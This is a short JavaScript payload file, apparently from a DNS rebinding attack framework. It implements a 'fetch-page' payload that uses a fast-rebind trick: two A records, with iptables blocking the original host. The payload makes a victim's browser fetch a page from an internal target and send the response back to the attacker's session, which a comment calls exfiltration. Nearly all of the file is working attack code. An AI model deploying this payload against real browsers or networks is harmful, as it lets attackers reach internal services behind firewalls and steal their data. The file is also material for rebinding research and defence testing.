// This is an implementation of the `fetch-page.js` payload using the
// framework's fastRebind capability.
// the fastRebind mode serves two A records (the original remote and the rebind
// target) and uses iptables rules to block the original remote after the
// payload has been loaded. On Chromium this will trigger a faster rebind,
// bypassing the need to wait for the DNS cache timeout.

import * as network from '../libs/network'
import Session from '../libs/session'

const session = new Session()

async function mainFrame () {
  session.createRebindFrame(window.args.host, window.args.port, {
    // enable fastRebind
    fastRebind: true,
    args: {
      path: window.args.path
    }
  })
}

function rebindFrame () {
  session.triggerRebind().then(() => {
    network.get(session.baseURL + window.args.path, (code, headers, body) => {
      // success callback
      session.log({ code: code, headers: headers, body: body })
      session.done()
    }, (code, headers, body) => {
      // fail callback
      // (we still want to exfiltrate the response even if it's i.e. a 404)
      session.log({ code: code, headers: headers, body: body })
      session.done()
    })
  })
}

if (window.args && window.args._rebind) rebindFrame()
else mainFrame()
